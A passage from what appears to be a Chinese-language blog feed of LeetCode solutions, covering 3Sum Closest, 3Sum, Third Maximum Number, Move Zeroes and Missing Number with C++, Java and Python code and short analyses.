<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * app:leetcode lang:c++</span></span><br><span class="line"><span class="comment"> * https://leetcode.com/problems/3sum-closest</span></span><br><span class="line"><span class="comment"> * time completicity is O(nlogn);</span></span><br><span class="line"><span class="comment"> * space complicity is O(1);</span></span><br><span class="line"><span class="comment"> * beats: 39.11%;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> Solution &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">threeSumClosest</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">		sort(nums.begin(), nums.end());</span><br><span class="line">		<span class="keyword">int</span> n = nums.size();</span><br><span class="line">		<span class="keyword">int</span> closet = nums[<span class="number">0</span>] + nums[<span class="number">1</span>] + nums[<span class="number">2</span>];</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n<span class="number">-1</span>; i++)&#123;</span><br><span class="line">			<span class="keyword">int</span> low = i + <span class="number">1</span>, high = n - <span class="number">1</span>;</span><br><span class="line">			<span class="keyword">while</span> (low &lt; high)&#123;</span><br><span class="line">				<span class="keyword">int</span> sum = nums[low] + nums[high] + nums[i];</span><br><span class="line">                closet = <span class="built_in">abs</span>(sum - target)&lt;<span class="built_in">abs</span>(closet - target) ? sum : closet;</span><br><span class="line">				<span class="keyword">if</span> (sum &lt; target)&#123;</span><br><span class="line">					low++;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span> (sum &gt; target)&#123;</span><br><span class="line">					</span><br><span class="line">					high--;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span>&#123;</span><br><span class="line">					<span class="keyword">return</span> sum;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> closet;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>python实现</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">threeSumClosest</span><span class="params">(self, nums, target)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type nums: List[int]</span></span><br><span class="line"><span class="string">        :type target: int</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        nums = sorted(nums)</span><br><span class="line">        n = len(nums)</span><br><span class="line">        closet = nums[<span class="number">0</span>] + nums[<span class="number">1</span>] + nums[<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,n<span class="number">-2</span>):</span><br><span class="line">            <span class="keyword">if</span> i &gt; <span class="number">0</span> <span class="keyword">and</span> nums[i]==nums[i<span class="number">-1</span>]:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            low = i + <span class="number">1</span></span><br><span class="line">            high = n - <span class="number">1</span></span><br><span class="line">            <span class="keyword">while</span> low &lt; high:</span><br><span class="line">                sum = nums[i] + nums[low] + nums[high]</span><br><span class="line">                <span class="keyword">if</span> abs(sum-target) &lt; abs(closet-target):</span><br><span class="line">                    closet = sum</span><br><span class="line">                <span class="keyword">if</span> sum &lt; target:</span><br><span class="line">                    low += <span class="number">1</span></span><br><span class="line">                <span class="keyword">elif</span> sum &gt; target:</span><br><span class="line">                    high -= <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">return</span> closet</span><br><span class="line">        <span class="keyword">return</span> closet</span><br></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这和3sum，4sum等是一类型的题目，需要注意两点：</p>
<ol>
<li>一定要先排序</li>
<li>对于重复元素的去重判断</li>
</ol>
]]></content>
      <tags>
        <tag>双指针+逼近法</tag>
        <tag>Array</tag>
        <tag>LeetCode-medium</tag>
      </tags>
  </entry>
  <entry>
    <title>15. 3Sum</title>
    <url>/2018/02/04/15-3Sum/</url>
    <content><![CDATA[<p>Given an array <code>nums</code> of <em>n</em> integers, are there elements <em>a</em>, <em>b</em>, <em>c</em> in <code>nums</code> such that <em>a</em> + <em>b</em> + <em>c</em> = 0? Find all unique triplets in the array which gives the sum of zero.</p>
<p><strong>Note:</strong></p>
<p>The solution set must not contain duplicate triplets.</p>
<p><strong>Example:</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Given array nums = [-<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, -<span class="number">1</span>, -<span class="number">4</span>],</span><br><span class="line"></span><br><span class="line">A solution set is:</span><br><span class="line">[</span><br><span class="line">  [-<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">  [-<span class="number">1</span>, -<span class="number">1</span>, <span class="number">2</span>]</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>借助排序，使用双指针，由于双指针外嵌套了一个循环，所以时间复杂度是$O(nlogn)$。</p>
<h2 id="去重复的问题"><a href="#去重复的问题" class="headerlink" title="去重复的问题"></a>去重复的问题</h2><p>这里难点在于，如何去除<strong>结果中的重复问题</strong>，去重最先想到了手段是Hash，使用<code>Set</code>和<code>Map</code>最常用手段，但这个题不是单个元素，而是对数组去重，那么只能添加判断手动去除。</p>
<p>这里再两个地方去重：</p>
<ol>
<li>外层循环时，判断第一个元素是否重复；</li>
<li>当查找到一个合适数组时，此时应继续查找。但继续查找第二三个合适元素时，应该判断第二三个元素是否重复，如果重复，则跳过。</li>
</ol>
<p><strong>Java实现</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * app:leetcode lang:Java</span></span><br><span class="line"><span class="comment"> * https://leetcode.com/problems/3sum</span></span><br><span class="line"><span class="comment"> * Beats :  89.47%</span></span><br><span class="line"><span class="comment"> * Time complicity is O(nlogn);</span></span><br><span class="line"><span class="comment"> * Space complicity is O(1);</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; threeSum(<span class="keyword">int</span>[] nums) &#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.length;</span><br><span class="line">        Arrays.sort(nums);</span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; result = <span class="keyword">new</span> ArrayList&lt;List&lt;Integer&gt;&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; n-<span class="number">2</span>; i++) &#123;</span><br><span class="line">            <span class="comment">//1.第一个元素去除重复</span></span><br><span class="line">            <span class="keyword">if</span>(i &gt; <span class="number">0</span> &amp;&amp; nums[i]==nums[i-<span class="number">1</span>]) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">int</span> low = i+<span class="number">1</span>,high = n-<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">while</span>(low &lt; high) &#123;</span><br><span class="line">                <span class="keyword">int</span> sum = nums[i]+nums[low]+nums[high];</span><br><span class="line">                <span class="keyword">if</span>(sum &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                    low++;</span><br><span class="line">                &#125;<span class="keyword">else</span> <span class="keyword">if</span>(sum &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    high--;</span><br><span class="line">                &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                    result.add(Arrays.asList(nums[i],nums[low],nums[high]));</span><br><span class="line">                    <span class="comment">//2.第二三个元素去除重复</span></span><br><span class="line">                    <span class="keyword">while</span>(low &lt; high &amp;&amp; nums[low]==nums[low+<span class="number">1</span>]) low++;</span><br><span class="line">                    <span class="keyword">while</span>(low &lt; high &amp;&amp; nums[high]==nums[high-<span class="number">1</span>]) high--;</span><br><span class="line">                    low++;</span><br><span class="line">                    high--;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>c++实现</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * app:leetcode lang:c++</span></span><br><span class="line"><span class="comment"> * https://leetcode.com/problems/3sum</span></span><br><span class="line"><span class="comment"> * time completicity is O(nlogn);</span></span><br><span class="line"><span class="comment"> * space complicity is O(1);</span></span><br><span class="line"><span class="comment"> * beats: 87.09%;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> Solution &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; threeSum(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums) &#123;</span><br><span class="line">		sort(nums.begin(),nums.end());</span><br><span class="line">		<span class="keyword">int</span> n = nums.size();</span><br><span class="line">		<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; result;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n - <span class="number">1</span>; i++)&#123;</span><br><span class="line">            <span class="comment">//1.第一个元素去除重复</span></span><br><span class="line">            <span class="keyword">if</span> (i &gt; <span class="number">0</span> &amp;&amp; nums[i] == nums[i - <span class="number">1</span>]) <span class="keyword">continue</span>;</span><br><span class="line">			<span class="keyword">int</span> low = i + <span class="number">1</span>, high = n - <span class="number">1</span>;</span><br><span class="line">			<span class="keyword">while</span> (low &lt; high)&#123;</span><br><span class="line">				<span class="keyword">int</span> sum = nums[i] + nums[low] + nums[high];</span><br><span class="line">				<span class="keyword">if</span> (sum &lt; <span class="number">0</span>)&#123;</span><br><span class="line">					low++;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span> (sum &gt; <span class="number">0</span>)&#123;</span><br><span class="line">					high--;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span>&#123;</span><br><span class="line">					<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; v;</span><br><span class="line">					v.push_back(nums[i]);</span><br><span class="line">					v.push_back(nums[low]);</span><br><span class="line">					v.push_back(nums[high]);</span><br><span class="line">					result.push_back(v);</span><br><span class="line">                    <span class="comment">//2.第二三个元素去除重复</span></span><br><span class="line">					<span class="keyword">while</span> ((low &lt; high) &amp;&amp; (nums[low] == nums[low + <span class="number">1</span>])) low++;</span><br><span class="line">					<span class="keyword">while</span> ((low &lt; high) &amp;&amp; (nums[high] == nums[high - <span class="number">1</span>])) high--;</span><br><span class="line">					low++;</span><br><span class="line">					high--;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>python实现</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">threeSum</span><span class="params">(self, nums)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type nums: List[int]</span></span><br><span class="line"><span class="string">        :rtype: List[List[int]]</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        nums = sorted(nums)</span><br><span class="line">        n = len(nums)</span><br><span class="line">        result = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,n<span class="number">-2</span>):</span><br><span class="line">            <span class="keyword">if</span> i &gt; <span class="number">0</span> <span class="keyword">and</span> nums[i] == nums[i<span class="number">-1</span>]:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            low = i + <span class="number">1</span></span><br><span class="line">            high = n - <span class="number">1</span></span><br><span class="line">            <span class="keyword">while</span> low &lt; high:</span><br><span class="line">                sum = nums[i]+nums[low]+nums[high]</span><br><span class="line">                <span class="keyword">if</span> sum &lt; <span class="number">0</span>:</span><br><span class="line">                    low += <span class="number">1</span></span><br><span class="line">                <span class="keyword">elif</span> sum &gt; <span class="number">0</span>:</span><br><span class="line">                    high -= <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    res = [nums[i],nums[low],nums[high]]</span><br><span class="line">                    result.append(res)</span><br><span class="line">                    <span class="keyword">while</span> low &lt; high <span class="keyword">and</span> nums[low] == nums[low+<span class="number">1</span>]:</span><br><span class="line">                        low += <span class="number">1</span></span><br><span class="line">                    <span class="keyword">while</span> low &lt; high <span class="keyword">and</span> nums[high] == nums[high<span class="number">-1</span>]:</span><br><span class="line">                        high -= <span class="number">1</span></span><br><span class="line">                    low += <span class="number">1</span></span><br><span class="line">                    high -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure>
<h2 id="考察点"><a href="#考察点" class="headerlink" title="考察点"></a>考察点</h2><p>如何去除结果的重复。针对三个元素分别判断重复。</p>
]]></content>
      <tags>
        <tag>双指针+逼近法</tag>
        <tag>Array</tag>
        <tag>LeetCode-medium</tag>
      </tags>
  </entry>
  <entry>
    <title>414. Third Maximum Number</title>
    <url>/2018/01/30/414-Third-Maximum-Number/</url>
    <content><![CDATA[<p>Given a <strong>non-empty</strong> array of integers, return the <strong>third</strong> maximum number in this array. If it does not exist, return the maximum number. The time complexity must be in O(n).</p>
<p><strong>Example 1:</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Input: [<span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">Output: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">Explanation: The third maximum is <span class="number">1</span>.</span><br></pre></td></tr></table></figure>
<p><strong>Example 2:</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Input: [<span class="number">1</span>, <span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">Output: <span class="number">2</span></span><br><span class="line"></span><br><span class="line">Explanation: The third maximum does not exist, <span class="function">so the <span class="title">maximum</span> <span class="params">(<span class="number">2</span>)</span> is returned instead.</span></span><br></pre></td></tr></table></figure>
<p><strong>Example 3:</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Input: [<span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">Output: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">Explanation: Note that the third maximum here means the third maximum distinct number.</span><br><span class="line">Both numbers with value <span class="number">2</span> are both considered as second maximum.</span><br></pre></td></tr></table></figure>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>查找第三个最大的数，这个问题以前应该碰到过类似问题，查找最大的都会，但是问题变为第三个最大的就不会了。</p>
<p>思路：</p>
<ol>
<li><p>借助一个set集合，set内部会按照有序排列，c++中只要不用unordered_set就行，这样set会自动排序这个数组，我们只需要维护这个set集合大小为3，那么其实就找出了前三个最大的数了。</p>
</li>
<li><p>当然这个问题也可以用来找最小的3个数，只不过此时将从set集合的尾部删除元素。</p>
</li>
</ol>
<p><strong>c++实现</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * app:leetcode lang:c++</span></span><br><span class="line"><span class="comment"> * https://leetcode.com/problems/third-maximum-number/</span></span><br><span class="line"><span class="comment"> * Beats : 100%</span></span><br><span class="line"><span class="comment"> * Time complicity is O(n);</span></span><br><span class="line"><span class="comment"> * Space complicity is O(n);</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> Solution &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">thirdMax</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">		<span class="built_in">set</span>&lt;<span class="keyword">int</span>&gt; top3;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> num : nums)&#123;</span><br><span class="line">			top3.insert(num);</span><br><span class="line">			<span class="keyword">if</span> (top3.size() &gt; <span class="number">3</span>)&#123;</span><br><span class="line">				top3.erase(top3.begin());</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">        <span class="comment">//注意end返回最后一个元素的下一个位置，所以要用rbegin</span></span><br><span class="line">		<span class="keyword">return</span> top3.size() == <span class="number">3</span> ? *top3.begin() : *top3.rbegin();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>需要注意的是：<code>set.end()</code>返回的是最后一个元素的下一个位置。所以使用<code>set.rbegin()</code></p>
<p>同时，<code>top3.erase(top3.begin());</code>用于删除头元素，也就是删除set中最小的元素，所以就剩下最大的3个元素了；如果此题是查找最小的3个元素，那么就变成了<code>top3.erase(top3.rbegin());</code>删除集合中最大的元素</p>
<p>这道题目python实现上述算法，有点困难。这里给一个网上的python作为<strong>参考</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">thirdMax</span><span class="params">(self, nums)</span>:</span></span><br><span class="line">        nums = sorted(list(set(nums)))</span><br><span class="line">        <span class="keyword">if</span> len(nums)&lt;<span class="number">3</span>:</span><br><span class="line">            <span class="keyword">return</span> max(nums)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> nums[<span class="number">-3</span>]</span><br></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>set，map集合可以借助其默认有序的特点，对其保存最大n位或最小n位数，是很值得考虑的。</p>
]]></content>
      <tags>
        <tag>LeetCode-easy</tag>
        <tag>Array</tag>
        <tag>set(集合)</tag>
      </tags>
  </entry>
  <entry>
    <title>283. Move Zeroes</title>
    <url>/2018/01/30/283-Move-Zeroes/</url>
    <content><![CDATA[<p>Given an array <code>nums</code>, write a function to move all <code>0</code>‘s to the end of it while maintaining the relative order of the non-zero elements.</p>
<p><strong>Example:</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Input: [<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">12</span>]</span><br><span class="line">Output: [<span class="number">1</span>,<span class="number">3</span>,<span class="number">12</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br></pre></td></tr></table></figure>
<p><strong>Note</strong>:</p>
<ol>
<li>You must do this <strong>in-place</strong> without making a copy of the array.</li>
<li>Minimize the total number of operations.</li>
</ol>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>这个问题想复杂了，其实很简单，设置一个索引把非零数按序重新按序排列，最后将后面补0</p>
<p><strong>c++实现</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * app:leetcode lang:c++</span></span><br><span class="line"><span class="comment"> * https://leetcode.com/problems/move-zeroes</span></span><br><span class="line"><span class="comment"> * Beats : 99.83%</span></span><br><span class="line"><span class="comment"> * Time complicity is O(n);</span></span><br><span class="line"><span class="comment"> * Space complicity is O(1);</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> Solution &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">moveZeroes</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">int</span> n = nums.size();</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">			<span class="keyword">if</span> (nums[i] != <span class="number">0</span>)&#123;</span><br><span class="line">				nums[index++] = nums[i];</span><br><span class="line"> 			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = index; j &lt; n; j++)&#123;</span><br><span class="line">			nums[j] = <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>python实现</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">moveZeroes</span><span class="params">(self, nums)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type nums: List[int]</span></span><br><span class="line"><span class="string">        :rtype: None Do not return anything, modify nums in-place instead.</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        index = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(nums)):</span><br><span class="line">            <span class="keyword">if</span> nums[i] != <span class="number">0</span>:</span><br><span class="line">                nums[index] = nums[i]</span><br><span class="line">                index += <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(index,len(nums)):</span><br><span class="line">            nums[i] = <span class="number">0</span></span><br></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>有时候，这种问题很简单，不要把它想得太难了，直接遍历可能会很容易。</p>
]]></content>
      <tags>
        <tag>LeetCode-easy</tag>
        <tag>Array</tag>
      </tags>
  </entry>
  <entry>
    <title>268. Missing Number</title>
    <url>/2018/01/30/268-Missing-Number/</url>
    <content><![CDATA[<p>Given an array containing <em>n</em> distinct numbers taken from <code>0, 1, 2, ..., n</code>, find the one that is missing from the array.</p>
<p><strong>Example 1:</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Input: [<span class="number">3</span>,<span class="number">0</span>,<span class="number">1</span>]</span><br><span class="line">Output: <span class="number">2</span></span><br></pre></td></tr></table></figure>
<p><strong>Example 2:</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Input: [<span class="number">9</span>,<span class="number">6</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">1</span>]</span><br><span class="line">Output: <span class="number">8</span></span><br></pre></td></tr></table></figure>
<p><strong>Note</strong>:<br>Your algorithm should run in linear runtime complexity. Could you implement it using only constant extra space complexity?</p>
<a id="more"></a>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>这里可以用，排序，HashSet这两种解决，但是排序的时间复杂度为$O(nlogn)$，HashSet的空间复杂度为$O(n)$，某种程度上都不是最优。所以这两种方法可以思考下。</p>
<p>多种方法可以参考：<a href="https://leetcode.com/problems/missing-number/solution/" target="_blank" rel="noopener">https://leetcode.com/problems/missing-number/solution/</a></p>
<h2 id="解法一-高斯公式"><a href="#解法一-高斯公式" class="headerlink" title="解法一-高斯公式"></a>解法一-高斯公式</h2><p>众所周知，有一个小故事就是说高斯在小时候就知道计算连续序列的技巧，那就是$s_n = n(a_1+a_n)/2$</p>
<p><strong>c++实现</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * app:leetcode lang:c++</span></span><br><span class="line"><span class="comment"> * https://leetcode.com/problems/missing-number</span></span><br><span class="line"><span class="comment"> * Beats : 22.73% </span></span><br><span class="line"><span class="comment"> * Time complicity is O(n);</span></span><br><span class="line"><span class="comment"> * Space complicity is O(1);</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> Solution &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">missingNumber</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> n = nums.size();</span><br><span class="line">		<span class="keyword">int</span> sum = (n+<span class="number">1</span>) * n / <span class="number">2</span>;</span><br><span class="line">		<span class="keyword">int</span> add = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">			add += nums[i];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> sum - add;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>python实现</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">missingNumber</span><span class="params">(self, nums)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type nums: List[int]</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        n = len(nums)</span><br><span class="line">        sum = (n+<span class="number">1</span>)*n/<span class="number">2</span></span><br><span class="line">        add = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,n):</span><br><span class="line">            add += nums[i]</span><br><span class="line">        <span class="keyword">return</span> sum - add;</span><br></pre></td></tr></table></figure>
<h2 id="解法二-Bit-Manipulation-位操作"><a href="#解法二-Bit-Manipulation-位操作" class="headerlink" title="解法二-Bit Manipulation(位操作)"></a>解法二-Bit Manipulation(位操作)</h2><table>
<thead>
<tr>
<th>Index</th>
<th>0</th>
<th>1</th>
<th>2</th>
<th>3</th>
</tr>
</thead>
<tbody>
<tr>
<td>Value</td>
<td>0</td>
<td>1</td>
<td>3</td>
<td>4</td>
</tr>
</tbody>
</table>
<blockquote>
<p>missing = 4^ (0^0) ^ (1^1) ^ (2^3) ^ (3^4) = (4^4) ^ (3^3) ^ (1^1) ^ 2 = 0 ^ 0 ^ 0 ^2 = 2</p>
</blockquote>
<p>看懂上面这个，就知道了本题可以使用位操作，借助异或操作来找出。</p>
<p><strong>c++实现</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * app:leetcode lang:c++</span></span><br><span class="line"><span class="comment"> * https://leetcode.com/problems/missing-number</span></span><br><span class="line"><span class="comment"> * Beats : 17.30%</span></span><br><span class="line"><span class="comment"> * Time complicity is O(n);</span></span><br><span class="line"><span class="comment"> * Space complicity is O(1);</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> Solution &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">missingNumber</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//注意这里初始值为n</span></span><br><span class="line">		<span class="keyword">int</span> n = nums.size();</span><br><span class="line">		<span class="keyword">int</span> miss = nums.size();</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">			miss = miss^i^nums[i];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> miss;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">missingNumber</span><span class="params">(self, nums)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type nums: List[int]</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        miss = len(nums)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(nums)):</span><br><span class="line">            miss = miss ^ i ^ nums[i]</span><br><span class="line">        <span class="keyword">return</span> miss</span><br></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>位操作是一个很好的办法，以后在很多问题上也会见到位操作的技巧，其中异或操作作为很有特点的操作，在处理一些问题上很有效。</p>
]]></content>
      <tags>
        <tag>LeetCode-easy</tag>
        <tag>Array</tag>
        <tag>Bit Manipulation(位操作)</tag>
      </tags>
  </entry>
  <entry>
    <title>219. Contains Duplicate II</title>
